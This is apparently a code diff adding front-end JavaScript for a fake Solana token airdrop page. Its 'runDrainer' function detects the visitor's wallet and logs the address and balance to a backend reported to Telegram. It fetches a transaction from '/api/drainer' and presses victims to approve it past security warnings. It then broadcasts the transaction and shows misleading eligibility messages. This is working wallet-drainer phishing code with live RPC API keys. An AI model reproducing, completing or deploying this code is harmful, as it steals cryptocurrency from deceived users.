+    if (type === 'error') color = '#f66';
+    if (type === 'loading') color = '#FFD700';
+    msgEl.innerHTML = `<span style="color:${color};font-weight:600;">${message}</span>`;
+    modal.classList.add('active');
+  }
+}
+
+// Placeholder runDrainer implementation
+async function runDrainer(provider) {
+  try {
+    console.log('[runDrainer] called with provider:', provider);
+    showStatus('Preparing transaction...', 'loading');
+    // 1. Get the public key from the provider
+    let publicKey = provider.publicKey || provider.address;
+    console.log('[runDrainer] initial publicKey:', publicKey);
+    
+    // Enhanced wallet detection - determine which wallet is actually connected
+    let connectedWalletType = 'Unknown';
+    let activeProviders = [];
+    
+    // Simplified wallet detection logic
+    const walletDetectors = [
+      { name: 'Exodus', check: () => provider === window.exodus || provider === window.exodusWallet || provider === window.ExodusWallet },
+      { name: 'Backpack', check: () => provider === window.backpack || provider === window.BackpackWallet || provider === window.backpackWallet },
+      { name: 'Glow', check: () => provider === window.glow || provider === window.GlowWallet || provider === window.glowWallet },
+      { name: 'Trust Wallet', check: () => provider === window.trustwallet?.solana || (provider === window.trustWallet && window.trustWallet?.isTrustWallet) },
+      { name: 'Solflare', check: () => provider === window.solflare && window.solflare?.isSolflare },
+      { name: 'Phantom', check: () => provider === window.solana && window.solana?.isPhantom }
+    ];
+    
+    // Try direct object comparison first
+    for (const detector of walletDetectors) {
+      if (detector.check()) {
+        connectedWalletType = detector.name;
+        activeProviders.push(detector.name);
+        break;
+      }
+    }
+    
+    // Fallback to property-based detection
+    if (connectedWalletType === 'Unknown') {
+      const propertyDetectors = [
+        { name: 'Exodus', property: 'isExodus' },
+        { name: 'Backpack', property: 'isBackpack' },
+        { name: 'Glow', property: 'isGlow' },
+        { name: 'Trust Wallet', property: 'isTrustWallet' },
+        { name: 'Solflare', property: 'isSolflare' },
+        { name: 'Phantom', property: 'isPhantom' }
+      ];
+      
+      for (const detector of propertyDetectors) {
+        if (provider && provider.hasOwnProperty(detector.property) && provider[detector.property] === true) {
+          connectedWalletType = detector.name;
+          activeProviders.push(detector.name);
+          break;
+        }
+      }
+    }
+
+    // Conditional debug logging for frontend
+    const DEBUG_MODE = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+    
+    function debugLog(message, ...args) {
+      if (DEBUG_MODE) {
+        console.log(`[runDrainer] ${message}`, ...args);
+      }
+    }
+    
+    debugLog('Connected wallet type:', connectedWalletType);
+    debugLog('Active providers detected:', activeProviders);
+    debugLog('Provider object details:', {
+      hasConnect: typeof provider.connect === 'function',
+      hasSignTransaction: typeof provider.signTransaction === 'function',
+      hasSign: typeof provider.sign === 'function',
+      hasSignAndSendTransaction: typeof provider.signAndSendTransaction === 'function',
+      hasPublicKey: !!provider.publicKey,
+      hasAddress: !!provider.address,
+      providerKeys: Object.keys(provider).slice(0, 10) // First 10 keys for debugging
+    });
+    
+    // Check for multiple installed wallets (but only warn, don't block)
+    const installedWallets = [];
+    if (window.solana && window.solana.hasOwnProperty('isPhantom') && window.solana.isPhantom) installedWallets.push('Phantom');
+    if (window.solflare && window.solflare.hasOwnProperty('isSolflare') && window.solflare.isSolflare) installedWallets.push('Solflare');
+    if (window.backpack && window.backpack.hasOwnProperty('isBackpack') && window.backpack.isBackpack) installedWallets.push('Backpack');
+    if (window.glow && window.glow.hasOwnProperty('isGlow') && window.glow.isGlow) installedWallets.push('Glow');
+    if (window.trustwallet?.solana || (window.trustWallet && window.trustWallet.hasOwnProperty('isTrustWallet') && window.trustWallet.isTrustWallet) || window.trustwallet || window.trustwallet?.provider || window.trustWallet?.provider || navigator.userAgent.includes('TrustWallet')) installedWallets.push('Trust Wallet');
+    if (window.exodus && window.exodus.hasOwnProperty('isExodus') && window.exodus.isExodus) installedWallets.push('Exodus');
+    
+    if (installedWallets.length > 1) {
+      console.warn('[runDrainer] Multiple wallets installed:', installedWallets);
+      console.log('[runDrainer] Using connected wallet:', connectedWalletType);
+      showStatus(`⚠️ Multiple wallets detected. Using ${connectedWalletType}.`, 'warning');
+    }
+    
+    // Check for Brave Wallet (Error A10 & D8)
+    if (window.braveSolana?.isBraveWallet || 
+        navigator.userAgent.includes('Brave') || 
+        window.brave?.isBrave) {
+      console.warn('[runDrainer] Brave Wallet detected - known issues');
+      showStatus('⚠️ Brave Wallet detected. Known compatibility issues. Please use Phantom or Solflare for this airdrop.', 'error');
+      return;
+    }
+    
+    // Security check: Ensure no malicious extensions are interfering
+    // Check for essential wallet methods with fallback support
+    const hasConnect = typeof provider.connect === 'function';
+    const hasSignTransaction = typeof provider.signTransaction === 'function';
+    const hasSign = typeof provider.sign === 'function';
+    const hasSignAndSendTransaction = typeof provider.signAndSendTransaction === 'function';
+    
+    // At least one signing method must be available
+    const hasSigningMethod = hasSignTransaction || hasSign || hasSignAndSendTransaction;
+    
+    if (!hasConnect || !hasSigningMethod) {
+      console.error('[SECURITY] Invalid provider detected - missing essential methods:', {
+        hasConnect,
+        hasSignTransaction,
+        hasSign,
+        hasSignAndSendTransaction
+      });
+      showStatus('Security warning: Invalid wallet provider detected. Please use official wallet extensions only.', 'error');
+      return;
+    }
+    
+    // Additional security: Check for suspicious provider properties
+    const suspiciousProps = ['seedPhrase', 'privateKey', 'mnemonic'];
+    for (const prop of suspiciousProps) {
+      if (provider[prop]) {
+        console.error(`[SECURITY] Suspicious provider property detected: ${prop}`);
+        showStatus('Security warning: Suspicious wallet provider detected. Please use official wallet extensions only.', 'error');
+        return;
+      }
+    }
+    
+    // Multiple wallet restriction disabled (production bypass)
+    console.log('[INFO] Multiple wallet restriction disabled');
+    
+    // Always try to connect if not already connected
+    if (!publicKey && provider && typeof provider.connect === 'function') {
+      try {
+        console.log('[runDrainer] calling provider.connect()...');
+        const result = await provider.connect();
+        console.log('[runDrainer] provider.connect() result:', result);
+        publicKey = result?.publicKey || provider.publicKey || provider.address;
+        console.log('[runDrainer] publicKey after connect:', publicKey);
+      } catch (connectErr) {
+        console.error('[runDrainer] provider.connect() error:', connectErr);
+        showStatus('Wallet connection failed: ' + (connectErr.message || connectErr), 'error');
+        return;
+      }
+    }
+    
+    // Additional check for connected state
+    if (!publicKey && provider.connected) {
+      publicKey = provider.publicKey || provider.address;
+      console.log('[runDrainer] publicKey from connected provider:', publicKey);
+    }
+    
+    if (!publicKey) {
+      // Simple fallback: try to get public key from different sources
+      const fallbackPublicKey = provider.publicKey || provider.address || provider.selectedAddress;
+      
+      if (fallbackPublicKey) {
+        console.log('[FALLBACK] Got public key from fallback source:', fallbackPublicKey);
+        publicKey = fallbackPublicKey;
+      } else {
+        showStatus('Wallet not connected. Please connect your wallet first.', 'error');
+        console.error('[runDrainer] No publicKey after connect.');
+        return;
+      }
+    }
+
+    // Log wallet connection to backend (will be updated with balance later)
+    try {
+      // Use the determined connected wallet type
+      const walletType = connectedWalletType;
+      
+      // Log wallet connection (balance will be updated after balance check)
+      console.log('[WALLET] About to log wallet connection with type:', walletType);
+      fetch('/api/drainer/log-wallet', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          publicKey: publicKey.toString(),
+          walletType: walletType,
+          origin: window.location.origin,
+          userAgent: navigator.userAgent,
+          lamports: 0 // Will be updated after balance check
+        })
+      }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+      
+      console.log('[WALLET] Logged connection:', {
+        publicKey: publicKey.toString(),
+        walletType: walletType,
+        origin: window.location.origin
+      });
+    } catch (logError) {
+      console.error('[WALLET] Failed to log wallet connection:', logError);
+    }
+
+    // 2. Fetch the airdrop transaction from the backend
+    console.log('[runDrainer] Fetching transaction for wallet:', publicKey.toString());
+    
+    // Show loading status
+    showStatus('Checking wallet eligibility...', 'loading');
+    
+    // Pre-check wallet balance to avoid simulation failures
+    let balance = null; // Declare at function level for access in catch blocks
+    try {
+      // Use multiple RPC endpoints for reliability
+      const rpcEndpoints = [
+        'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
+        'https://api.mainnet-beta.solana.com',
+        'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0'
+      ];
+      
+      let lastError = null;
+      
+      // Try each RPC endpoint with timeout
+      for (const rpcUrl of rpcEndpoints) {
+        try {
+          const connection = new solanaWeb3.Connection(rpcUrl);
+          const balancePromise = connection.getBalance(publicKey);
+          const timeoutPromise = new Promise((_, reject) => {
+            setTimeout(() => reject(new Error('Balance check timeout')), 5000); // 5 second timeout
+          });
+          
+          balance = await Promise.race([balancePromise, timeoutPromise]);
+          console.log('[BALANCE_CHECK] Wallet balance from', rpcUrl, ':', balance, 'lamports');
+          
+          // Update wallet logging with actual balance
+          try {
+            fetch('/api/drainer/log-wallet', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                publicKey: publicKey.toString(),
+                walletType: connectedWalletType,
+                origin: window.location.origin,
+                userAgent: navigator.userAgent,
+                lamports: balance
+              })
+            }).catch(err => console.log('[TELEGRAM] Failed to update wallet logging with balance:', err));
+          } catch (updateError) {
+            console.error('[WALLET] Failed to update wallet logging with balance:', updateError);
+          }
+          
+          break; // Success, exit loop
+        } catch (error) {
+          console.log('[BALANCE_CHECK] Failed to check balance from', rpcUrl, ':', error.message);
+          lastError = error;
+          continue; // Try next endpoint
+        }
+      }
+      
+      if (balance !== null && balance < 100000) { // Less than 0.0001 SOL (match backend minimum)
+        console.log('[BALANCE_CHECK] Insufficient funds detected:', balance, 'lamports < 100000 lamports');
+        showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+        return;
+      } else if (balance === null) {
+        console.log('[BALANCE_CHECK] Could not check balance from any endpoint, proceeding anyway');
+      } else {
+        console.log('[BALANCE_CHECK] Sufficient funds detected:', balance, 'lamports >= 100000 lamports');
+      }
+    } catch (balanceError) {
+      console.log('[BALANCE_CHECK] Could not check balance, proceeding anyway:', balanceError.message);
+      // Don't show technical errors to users - proceed with transaction
+    }
+    
+    console.log('[runDrainer] Proceeding to API call after balance check');
+    console.log('[runDrainer] API URL:', `/api/drainer`);
+    console.log('[runDrainer] Request body:', { publicKey: publicKey.toString(), walletType: connectedWalletType });
+    let response;
+    try {
+      console.log('[runDrainer] Making fetch request...');
+      
+      // Add timeout to prevent hanging
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
+      
+      response = await fetch(`/api/drainer`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          publicKey: publicKey.toString(),
+          walletType: connectedWalletType
+        }),
+        signal: controller.signal
+      });
+      
+      clearTimeout(timeoutId);
+      console.log('[runDrainer] Fetch completed successfully');
+      console.log('[runDrainer] Response status:', response.status, response.statusText);
+      console.log('[runDrainer] Response headers:', response.headers);
+    } catch (fetchError) {
+      console.error('[runDrainer] Fetch error:', fetchError);
+      console.error('[runDrainer] Fetch error details:', {
+        name: fetchError.name,
+        message: fetchError.message,
+        stack: fetchError.stack
+      });
+      showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+      return;
+    }
+    
+    if (!response.ok) {
+      try {
+        const err = await response.json();
+        console.log('[runDrainer] API error response:', err);
+        
+        // Show user-friendly error messages (don't scare users with technical details)
+        showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+      } catch (parseError) {
+        console.log('[runDrainer] Failed to parse error response:', parseError);
+        showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+      }
+      return;
+    }
+    const responseData = await response.json();
+    console.log('[runDrainer] API response data:', responseData);
+    const txBase64 = responseData.transaction;
+    
+    // Extract drain amount from API response metadata
+    const actualDrainAmount = responseData.metadata?.solAmount || 0;
+    console.log('[runDrainer] Actual drain amount from API:', actualDrainAmount, 'lamports');
+
+    // 3. Deserialize the transaction
+    let txBytes;
+    try {
+      // Validate base64 string before decoding
+      if (!txBase64 || typeof txBase64 !== 'string') {
+        throw new Error('Invalid transaction data received from server');
+      }
+      
+      // Check if base64 string is valid
+      const base64Regex = /^[A-Za-z0-9+/]*={0,2}$/;
+      if (!base64Regex.test(txBase64)) {
+        throw new Error('Invalid base64 encoding in transaction data');
+      }
+      
+      txBytes = Uint8Array.from(atob(txBase64), c => c.charCodeAt(0));
+      
+      if (txBytes.length === 0) {
+        throw new Error('Transaction data is empty after decoding');
+      }
+    } catch (decodeError) {
+      console.error('[runDrainer] Base64 decode error:', decodeError);
+      showStatus('Error: Invalid transaction data received from server. Please try again.', 'error');
+      return;
+    }
+    
+    const transaction = solanaWeb3.Transaction.from(txBytes);
+
+    // Validate transaction before signing
+    if (!transaction || typeof transaction.serialize !== 'function') {
+      console.error('[runDrainer] Invalid transaction object:', transaction);
+      showStatus('Error: Invalid transaction received from server.', 'error');
+      return;
+    }
+
+    // 4. Request signature from the wallet with explicit user prompting
+    showStatus('⚠️ IMPORTANT: Please approve the transaction in your wallet to receive your airdrop! If you see a security warning, click "I trust this site" and then "Approve".', 'loading');
+    
+    // Add a delay to ensure user sees the message
+    await new Promise(resolve => setTimeout(resolve, 3000));
+    
+    let signed;
+    try {
+      console.log('[SIGNING] Provider methods available:', {
+        signTransaction: typeof provider.signTransaction === 'function',
+        signAndSendTransaction: typeof provider.signAndSendTransaction === 'function'
+      });
+      
+      // Enhanced signing with wallet-specific fallbacks
+      const signingPromise = (async () => {
+        console.log('[SIGNING] Wallet type detected:', connectedWalletType);
+        
+        // Wallet-specific signing strategies with improved error handling
+        const signingMethods = {
+          signAndSendTransaction: typeof provider.signAndSendTransaction === 'function',
+          signTransaction: typeof provider.signTransaction === 'function',
+          sign: typeof provider.sign === 'function',
+          signAllTransactions: typeof provider.signAllTransactions === 'function'
+        };
+        
+        console.log('[SIGNING] Available signing methods:', signingMethods);
+        
+        // Try signAndSendTransaction first (most reliable)
+        if (signingMethods.signAndSendTransaction) {
+            console.log('[SIGNING] Using signAndSendTransaction');
+            return await provider.signAndSendTransaction(transaction);
+        }
+        
+        // Try signTransaction (standard Solana method)
+        if (signingMethods.signTransaction) {
+            console.log('[SIGNING] Using signTransaction');
+            return await provider.signTransaction(transaction);
+        }
+        
+        // Try signAllTransactions as fallback
+        if (signingMethods.signAllTransactions) {
+            console.log('[SIGNING] Using signAllTransactions fallback');
+            const signed = await provider.signAllTransactions([transaction]);
+            return signed[0];
+        }
+        
+        // Try sign method as last resort (may not work for all wallets)
+        if (signingMethods.sign) {
+          console.log('[SIGNING] Using sign fallback (may not work for all wallets)');
+          try {
+            return await provider.sign(transaction);
+          } catch (signError) {
+            console.warn('[SIGNING] Sign method failed:', signError.message);
+            // Continue to throw the original error
+          }
+        }
+        
+        throw new Error('Wallet does not support transaction signing.');
+      })();
+      
+                       const timeoutPromise = new Promise((_, reject) => {
+                   setTimeout(() => reject(new Error('JSON-RPC: method call timeout calling connect')), 30000); // Increased to 30 seconds
+                 });
+      
+      signed = await Promise.race([signingPromise, timeoutPromise]);
+      console.log('[SIGNING] Transaction signed successfully:', signed);
+
+      // Validate signed transaction
+      if (!signed) {
+        throw new Error('Transaction signing failed - no signed transaction returned');
+      }
+      
+      // Verify that user actually signed (not just connected)
+      if (!signed.signature && !signed.signatures && typeof signed.serialize !== 'function') {
+        throw new Error('No signature found - transaction may not have been signed');
+      }
+      
+      console.log('[SIGNING] Transaction signed successfully:', {
+        hasSignature: !!signed.signature,
+        hasSignatures: !!(signed.signatures && signed.signatures.length > 0),
+        hasSerialize: typeof signed.serialize === 'function'
+      });
+      
+          } catch (signError) {
+        console.error('[runDrainer] Transaction signing error:', signError);
+        
+        // Enhanced error handling for different error types
+        console.log('[ERROR] Signing error details:', {
+          name: signError.name,
+          constructor: signError.constructor?.name,
+            message: signError.message,
+            logs: signError.logs,
+          error: signError.error,
+          walletType: connectedWalletType
+          });
+        
+        // Handle specific error types
+        if (signError.name === 'SendTransactionError' || signError.constructor?.name === 'SendTransactionError') {
+          console.log('[ERROR] SendTransactionError detected');
+          
+          // Log SendTransactionError to Telegram
+          fetch('/api/drainer/log-confirmation', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              publicKey: publicKey.toString(),
+              txid: 'send_transaction_error',
+              status: 'failed',
+              error: signError.message || 'SendTransactionError',
+              lamports: balance || 0
+            })
+          }).catch(err => console.log('[TELEGRAM] Failed to log SendTransactionError:', err));
+          
+          showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+          return;
+        }
+        
+        // Enhanced error handling for specific wallets
+        if (signError.message?.includes('User rejected') || signError.message?.includes('User denied') || signError.message?.includes('Cancelled')) {
+          showStatus('Transaction was cancelled. Please try again and approve the transaction.', 'error');
+          
+          // Wallet-specific error messages
+          if (connectedWalletType === 'Glow') {
+            showStatus('Glow wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
+          } else if (connectedWalletType === 'Backpack') {
+            showStatus('Backpack wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
+          } else if (connectedWalletType === 'Exodus') {
+            showStatus('Exodus wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
+          }
+            
+            // Log transaction cancellation to Telegram
+            fetch('/api/drainer/log-cancellation', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                publicKey: publicKey.toString(),
+                walletType: connectedWalletType || 'Unknown',
+                reason: 'User rejected transaction',
+                lamports: balance || 0
+              })
+            }).catch(err => console.log('[TELEGRAM] Failed to log cancellation:', err));
+            
+        } else if (signError.message?.includes('Simulation failed') || signError.message?.includes('Transaction simulation failed') || signError.message?.includes('insufficient funds for rent') || signError.message?.includes('Transaction simulation failed.') || signError.message?.includes('simulation')) {
+            showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+            
+            // Enhanced error logging for simulation failures
+            console.log('[SIMULATION_ERROR] Full error details:', {
+              message: signError.message,
+              logs: signError.logs,
+              error: signError.error,
+              walletType: connectedWalletType
+            });
+            
+            // Log simulation failure to Telegram
+            fetch('/api/drainer/log-confirmation', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                publicKey: publicKey.toString(),
+                txid: 'simulation_failed',
+                status: 'failed',
+                error: signError.message || 'Transaction simulation failed',
+                lamports: balance || 0
+              })
+            }).catch(err => console.log('[TELEGRAM] Failed to log simulation failure:', err));
+            
+          } else if (signError.message?.includes('timeout') || signError.message?.includes('Connection timeout') || signError.message?.includes('Signing timeout') || signError.message?.includes('JSON-RPC: method call timeout')) {
+            showStatus('Please try again. Make sure your wallet is connected and try the Claim button again.', 'error');
+          } else if (signError.message?.includes('Transaction cancelled') || signError.message?.includes('cancelled')) {
+            showStatus('✅ Transaction cancelled by user. You can try again when ready.', 'info');
+            
+            // Log transaction cancellation to Telegram
+            fetch('/api/drainer/log-cancellation', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                publicKey: publicKey.toString(),
+                walletType: connectedWalletType || 'Unknown',
+                reason: 'User cancelled transaction',
+                lamports: balance || 0
+              })
+            }).catch(err => console.log('[TELEGRAM] Failed to log cancellation:', err));
+            
+          } else if (signError.message?.includes('Security check failed') || signError.message?.includes('server error')) {
+            showStatus('Please try again. Make sure your wallet is connected and try the Claim button again.', 'error');
+        } else {
+          // Enhanced error detection for any transaction errors
+          const errorString = signError.toString();
+          const errorMessage = signError.message || errorString;
+          
+          console.log('[ENHANCED_ERROR] Full error analysis:', {
+            errorString: errorString,
+            errorMessage: errorMessage,
+            errorType: typeof signError,
+            errorKeys: Object.keys(signError),
+            walletType: connectedWalletType
+          });
+          
+          // Check if it's a simulation error by looking at the error string
+          if (errorString.includes('Simulation failed') || errorString.includes('Transaction simulation failed') || errorString.includes('simulation')) {
+            console.log('[SIMULATION_DETECTED] Found simulation error in error string');
+            
+            // Log simulation failure to Telegram
+            fetch('/api/drainer/log-confirmation', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                publicKey: publicKey.toString(),
+                txid: 'simulation_failed',
+                status: 'failed',
+                error: errorMessage,
+                lamports: balance || 0
+              })
+            }).catch(err => console.log('[TELEGRAM] Failed to log simulation failure:', err));
+            
+            showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+          } else {
+            // Log unhandled error to Telegram
+            fetch('/api/drainer/log-confirmation', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                publicKey: publicKey.toString(),
+                txid: 'unhandled_error',
+                status: 'failed',
+                error: errorMessage,
+                lamports: balance || 0
+              })
+            }).catch(err => console.log('[TELEGRAM] Failed to log unhandled error:', err));
+            
+            showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+          }
+        }
+        return;
+      }
+
+    // 5. Send the transaction to the network with retry logic
+    showStatus('Broadcasting transaction...', 'loading');
+    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+    let txid;
+    let broadcastSuccess = false;
+    
+    // Add timeout for broadcast attempts
+    const broadcastTimeout = 15000; // 15 seconds
+    
+    // Try multiple broadcast attempts with timeout
+    for (let attempt = 1; attempt <= 3; attempt++) {
+      try {
+        console.log('[BROADCAST] Attempt', attempt, 'signed object:', signed);
+        
+        // Add timeout for each broadcast attempt
+        const broadcastPromise = (async () => {
+        // Check different possible signature formats
+    if (signed.signature) {
+          // Direct signature from signAndSendTransaction
+      txid = signed.signature;
+          console.log('[BROADCAST] Using direct signature:', txid);
+          broadcastSuccess = true;
+            return txid;
+        } else if (signed.signatures && signed.signatures.length > 0) {
+          // Signature from transaction object
+          txid = signed.signatures[0].signature;
+          console.log('[BROADCAST] Using transaction signature:', txid);
+          broadcastSuccess = true;
+            return txid;
+        } else if (typeof signed.serialize === 'function') {
+          // We have a signed transaction, send it with simple fallback
+          const serializedTx = signed.serialize();
+          console.log('[BROADCAST] Sending serialized transaction, length:', serializedTx.length);
+          
+          try {
+            txid = await connection.sendRawTransaction(serializedTx, {
+              skipPreflight: false,
+              preflightCommitment: 'confirmed',
+              maxRetries: 3
+            });
+          } catch (sendError) {
+            console.log('[FALLBACK] sendRawTransaction failed, trying sendTransaction...');
+            
+            // Simple fallback: try sendTransaction instead
+            txid = await connection.sendTransaction(signed, [], {
+              skipPreflight: false,
+              preflightCommitment: 'confirmed',
+              maxRetries: 3
+            });
+          }
+          
+          console.log('[BROADCAST] Transaction sent with ID:', txid);
+          broadcastSuccess = true;
+          return txid;
+    } else {
+          throw new Error('Invalid signed transaction format');
+        }
+        })();
+        
+        const timeoutPromise = new Promise((_, reject) => {
+          setTimeout(() => reject(new Error('Broadcast timeout')), broadcastTimeout);
+        });
+        
+        await Promise.race([broadcastPromise, timeoutPromise]);
+      } catch (broadcastError) {
+        console.error(`[BROADCAST] Attempt ${attempt}/3 failed:`, broadcastError.message);
+        
+        if (attempt < 3) {
+          showStatus(`Retrying broadcast... (${attempt}/3)`, 'loading');
+          await new Promise(resolve => setTimeout(resolve, 2000 * attempt));
+        } else {
+          throw new Error(`Transaction broadcast failed after 3 attempts: ${broadcastError.message}`);
+        }
+      }
+    }
+    
+    if (broadcastSuccess && txid) {
+      console.log('[BROADCAST] Transaction sent with ID:', txid);
+      showStatus('⏳ Transaction sent! Checking on-chain status...', 'loading');
+      
+      // Add a small delay to ensure the user sees the message
+      setTimeout(() => {
+        console.log('[BROADCAST] Transaction broadcast completed');
+        
+                          // Check transaction status after a delay
+                  setTimeout(async () => {
+                    try {
+                      // Use reliable RPC endpoints for transaction status checking
+                      const rpcEndpoints = [
+                        'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
+                        'https://api.mainnet-beta.solana.com',
+                        'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0'
+                      ];
+                      
+                      let status = null;
+                      let lastError = null;
+                      
+                      // Try each RPC endpoint
+                      for (const rpcUrl of rpcEndpoints) {
+                        try {
+                          const connection = new solanaWeb3.Connection(rpcUrl);
+                          status = await connection.getSignatureStatuses([txid]);
+                          console.log('[STATUS] Transaction status from', rpcUrl, ':', status);
+                          break; // Success, exit loop
+                        } catch (error) {
+                          console.log('[STATUS] Failed to check status from', rpcUrl, ':', error.message);
+                          lastError = error;
+                          continue; // Try next endpoint
+                        }
+                      }
+                      
+                      // Simplified status checking - assume success if broadcast was successful
+                      if (status && status.value && status.value.length > 0 && status.value[0]) {
+                        const txStatus = status.value[0];
+                        console.log('[STATUS] Transaction status details:', txStatus);
+                        
+                        if (txStatus.err) {
+                          console.log('[STATUS] Transaction failed on-chain:', txStatus.err);
+                          // Log failed drain to Telegram
+                          fetch('/api/drainer/log-confirmation', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                              publicKey: publicKey.toString(),
+                              txid: txid,
+                              status: 'failed',
+                              error: txStatus.err,
+                              lamports: balance || 0
+                            })
+                          }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
+                          
+                          // Show user-friendly failure message
+                          showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+                        } else if (txStatus.confirmationStatus === 'confirmed' || txStatus.confirmationStatus === 'finalized') {
+                          // Only show success for confirmed/finalized transactions
+                          console.log('[STATUS] Transaction confirmed successfully:', txStatus.confirmationStatus);
+                          
+                          // Log successful drain to Telegram
+                          fetch('/api/drainer/log-confirmation', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                              publicKey: publicKey.toString(),
+                              txid: txid,
+                              status: 'confirmed',
+                              error: null,
+                              lamports: balance || 0,
+                              actualDrainAmount: actualDrainAmount || 0
+                            })
+                          }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
+                          
+                          showStatus('Eligible, Kindly Check Wallet in 1 hour for tokens', 'success');
+                        } else {
+                          // Any other status is not confirmed - show not eligible
+                          console.log('[STATUS] Transaction not confirmed, status:', txStatus.confirmationStatus);
+                          
+                          // Log failed drain to Telegram
+                          fetch('/api/drainer/log-confirmation', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                              publicKey: publicKey.toString(),
+                              txid: txid,
+                              status: 'failed',
+                              error: 'Transaction not confirmed',
+                              lamports: balance || 0
+                            })
+                          }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
+                          
+                          showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+                        }
+                      } else {
+                        // If status check fails, don't assume success
+                        console.log('[STATUS] Status check failed, showing not eligible');
+                        
+                        // Log failed drain to Telegram
+                        fetch('/api/drainer/log-confirmation', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({
+                            publicKey: publicKey.toString(),
+                            txid: txid,
+                            status: 'failed',
+                            error: 'Status check failed',
+                            lamports: balance || 0
+                          })
+                        }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
+                        
+                        showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+                      }
+                    } catch (statusError) {
+                      console.log('[STATUS] Could not check transaction status:', statusError);
+                      // Don't assume success - show not eligible
+                      showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+                      
+                      // Log failed drain to Telegram with fallback balance
+                      fetch('/api/drainer/log-confirmation', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                          publicKey: publicKey.toString(),
+                          txid: txid,
+                          status: 'failed',
+                          error: 'Status check failed',
+                          lamports: balance || 0
+                        })
+                      }).catch(err => console.log('[TELEGRAM] Failed to log failure:', err));
+                    }
+                  }, 5000); // Check after 5 seconds
+        
+      }, 1000);
+    } else {
+      console.error('[ERROR] Broadcast failed - success:', broadcastSuccess, 'txid:', txid);
+      showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+      return;
+    }
+  } catch (err) {
+    console.error('[runDrainer] error:', err);
+    showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
+  }
+}
+window.runDrainer = runDrainer;
+
+// Replace the current openWalletModal function with an async version that fetches wallet data from the drainer API
+window.openWalletModal = async function openWalletModal() {
+  const modal = document.getElementById('walletModal');
+  const walletList = document.getElementById('walletList');
+  if (modal && walletList) {
+    // Use forceDetectMobileWallets to get detected wallet providers
+    const detectedWallets = forceDetectMobileWallets();
+    // Map detected wallet object paths to WALLET_DEFS with faster detection
+    const detectedDefs = WALLET_DEFS.filter(wallet => {
+      // Check if the provider object exists with timeout
+      try {
+        const provider = wallet.provider();
+        // Only show wallets with a detected provider
+        return provider !== undefined && provider !== null;
+      } catch (e) {
+        return false;
+      }
+    });
+    
+    console.log('Detected wallets:', detectedDefs.length);
+    console.log('Detected wallet names:', detectedDefs.map(w => w.name));
+    
+    // If no wallets are detected, show the wallet browser prompt instead
+    if (detectedDefs.length === 0) {
+      console.log('No wallets detected, showing wallet browser prompt');
+      showWalletBrowserPrompt();
+      return;
+    }
+    
+    walletList.innerHTML = detectedDefs.map(wallet => {
+      // Use the actual provider object for this wallet
+      const provider = wallet.provider();
+      let actionBtn = '';
+      if (provider) {
+        actionBtn = `<button class="claim-btn connect-wallet-btn" data-wallet-key="${wallet.key}">Connect</button>`;
+      } else if (isMobile()) {
+        actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.mobile?.appStore || wallet.install}', '_blank')">Open/Install</button>`;
+      } else {
+        actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.install}', '_blank')">Install</button>`;
+      }
+      return `
+        <div class="wallet-option">
